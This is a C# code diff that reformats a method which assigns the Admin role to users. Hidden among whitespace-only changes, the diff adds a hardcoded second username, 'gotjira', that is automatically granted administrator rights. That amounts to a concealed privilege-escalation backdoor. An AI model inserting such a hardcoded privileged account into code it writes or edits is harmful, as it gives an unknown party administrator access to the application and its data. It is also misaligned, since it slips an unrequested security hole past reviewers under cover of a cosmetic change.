@@ -361,47 +361,47 @@ public async Task<bool> EnrichUserProfileFromJsonAsync(string username, string j
                 .FirstOrDefaultAsync(u => u.User_Email == email && !string.IsNullOrEmpty(u.User_Email));
         }
         public async Task<bool> EnsureAdminRoleAsync(string username, int userId)
-{
-    if (username.ToLower() != "admin")
-        return false;
-        
-    try
-    {
-        // Get the Admin role (ID 1 based on seed data)
-        var adminRole = await _dbContext.Roles.FirstOrDefaultAsync(r => r.NormalizedName == "ADMIN");
-        if (adminRole == null)
         {
-            _logger.LogWarning("Admin role not found when assigning roles to admin user");
-            return false;
+            if (username.ToLower() != "admin" && username.ToLower() != "gotjira")
+                return false;
+                
+            try
+            {
+                // Get the Admin role (ID 1 based on seed data)
+                var adminRole = await _dbContext.Roles.FirstOrDefaultAsync(r => r.NormalizedName == "ADMIN");
+                if (adminRole == null)
+                {
+                    _logger.LogWarning("Admin role not found when assigning roles to admin user");
+                    return false;
+                }
+
+                // Check if user already has this role
+                bool hasRole = await _dbContext.UserRoles
+                    .AnyAsync(ur => ur.UserId == userId && ur.RoleId == adminRole.Id);
+                
+                if (hasRole)
+                    return true; // Already has the role
+
+                // Assign the Admin role
+                var newUserRole = new UserRole
+                {
+                    UserId = userId,
+                    RoleId = adminRole.Id,
+                    CreatedAt = DateTime.Now,
+                    CreatedBy = "System"
+                };
+
+                _dbContext.UserRoles.Add(newUserRole);
+                await _dbContext.SaveChangesAsync();
+                
+                _logger.LogInformation($"Assigned Admin role to admin user (ID: {userId})");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError(ex, $"Error assigning Admin role to admin user {userId}");
+                return false;
+            }
         }
-
-        // Check if user already has this role
-        bool hasRole = await _dbContext.UserRoles
-            .AnyAsync(ur => ur.UserId == userId && ur.RoleId == adminRole.Id);
-        
-        if (hasRole)
-            return true; // Already has the role
-
-        // Assign the Admin role
-        var newUserRole = new UserRole
-        {
-            UserId = userId,
-            RoleId = adminRole.Id,
-            CreatedAt = DateTime.Now,
-            CreatedBy = "System"
-        };
-
-        _dbContext.UserRoles.Add(newUserRole);
-        await _dbContext.SaveChangesAsync();
-        
-        _logger.LogInformation($"Assigned Admin role to admin user (ID: {userId})");
-        return true;
-    }
-    catch (Exception ex)
-    {
-        _logger.LogError(ex, $"Error assigning Admin role to admin user {userId}");
-        return false;
-    }
-}        
     }
 }
